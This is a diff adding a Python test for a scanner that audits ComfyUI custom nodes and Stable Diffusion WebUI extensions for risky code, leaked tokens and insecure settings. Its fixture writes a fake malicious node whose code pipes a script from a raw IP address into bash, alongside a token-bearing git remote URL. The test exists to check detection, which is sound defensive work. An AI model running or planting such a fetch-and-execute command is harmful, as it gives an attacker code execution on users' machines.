@@ -350,5 +350,33 @@ def test_vet():
     assert 'password-protected' in ai.vet(z)
 
 
+def test_addons():
+    import arche.ai as ai
+    from arche.ai import direct_reqs
+    assert list(direct_reqs('torch @ https://download.pytorch.org/whl/torch-2.1.0.whl\nrequests==2.0\n# https://x.org/y.whl\n'
+                            'git+https://github.com/a/b.git#egg=b\n')) == [('torch', 'download.pytorch.org'), ('b', 'github.com')]
+    r = tempfile.mkdtemp(); atexit.register(shutil.rmtree, r, True)
+    c, w = f'{r}/ComfyUI', f'{r}/webui'
+    for d in ('comfy', 'custom_nodes/evil/.git', 'custom_nodes/.disabled/old', 'custom_nodes/__pycache__', 'user/default/ComfyUI-Manager'):
+        os.makedirs(f'{c}/{d}')
+    open(f'{c}/custom_nodes/evil/__init__.py', 'w').write('import os\nos.system("curl -fsSL http://45.9.1.2/x.sh | bash")\n')
+    open(f'{c}/custom_nodes/evil/requirements.txt', 'w').write('https://github.com/x/y/releases/download/v1/openai-1.16.3-py3-none-any.whl\n')
+    open(f'{c}/custom_nodes/evil/.git/config', 'w').write('[remote "origin"]\n\turl = https://bob:ghp_tok@github.com/x/evil\n')
+    open(f'{c}/custom_nodes/single.py', 'w').write('NODE_CLASS_MAPPINGS = {}\n')
+    open(f'{c}/user/default/ComfyUI-Manager/config.ini', 'w').write('[default]\nsecurity_level = weak\n')
+    os.makedirs(f'{w}/extensions/ext1'); open(f'{w}/webui.py', 'w').write('')
+    open(f'{w}/webui-user.sh', 'w').write('#export COMMANDLINE_ARGS="--share"\nexport COMMANDLINE_ARGS="--listen --enable-insecure-extension-access"\n')
+    old, ai.repos = ai.repos, lambda: [c, w]
+    try: rows = list(ai.addons())
+    finally: ai.repos = old
+    names = [t.split(' (')[0] for t, s, _ in rows if s == 0 and ', code ' in t]
+    assert names == ['ComfyUI custom node evil', 'ComfyUI custom node single', 'Stable Diffusion WebUI extension ext1'], rows
+    assert not any('ghp_tok' in t or 'bob' in t for t, _, _ in rows) and 'from https://github.com/x/evil' in rows[0][0], rows
+    assert any(s == 1 and 'piped into a shell' in t for t, s, _ in rows), rows
+    assert any(s == 0 and 'installs openai straight from github.com' in t for t, s, _ in rows), rows
+    assert sum(s == 1 and ('security_level' in t or 'install extensions' in t) for t, s, _ in rows) == 2, rows
+    assert not any('gradio.live' in t for t, _, _ in rows), rows
+
+
 if __name__ == '__main__':
-    test_vet(); test_agent_commands(); test_uvx_packages(); test_preapproved(); test_fingerprint(); test_openclaw(); test_copilot_plugins(); test_project_mcp(); test_rc_approvals_off(); test_chat_secrets(); test_hub_code(); test_chat_readers(); test_desktop_extension(); test_invisible_code(); test_claude_settings(); test_packages(); test_model_risks(); test_pickles(); test_text_rules(); test_mcp(); test_running(); print('ok')
+    test_addons(); test_vet(); test_agent_commands(); test_uvx_packages(); test_preapproved(); test_fingerprint(); test_openclaw(); test_copilot_plugins(); test_project_mcp(); test_rc_approvals_off(); test_chat_secrets(); test_hub_code(); test_chat_readers(); test_desktop_extension(); test_invisible_code(); test_claude_settings(); test_packages(); test_model_risks(); test_pickles(); test_text_rules(); test_mcp(); test_running(); print('ok')
